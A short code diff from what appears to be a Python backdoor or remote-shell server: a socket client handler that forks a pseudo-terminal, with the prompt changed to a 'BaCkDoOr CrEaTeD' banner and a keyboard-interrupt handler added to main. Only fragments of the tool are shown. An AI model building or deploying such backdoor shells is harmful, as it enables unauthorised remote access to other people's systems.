@@ -117,7 +117,7 @@ def client_handler(client_socket):
             import array
             
             # Send initial prompt
-            client_socket.send(b"<enp7s0d:#> \r\n")
+            client_socket.send(b"BaCkDoOr CrEaTeD eNjOy YoUr StAy \r\n")
             
             # Fork a new pseudo-terminal
             pid, fd = pty.fork()
@@ -287,4 +287,8 @@ def main():
     sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!!] Interrupted by user.")
+        sys.exit(1)
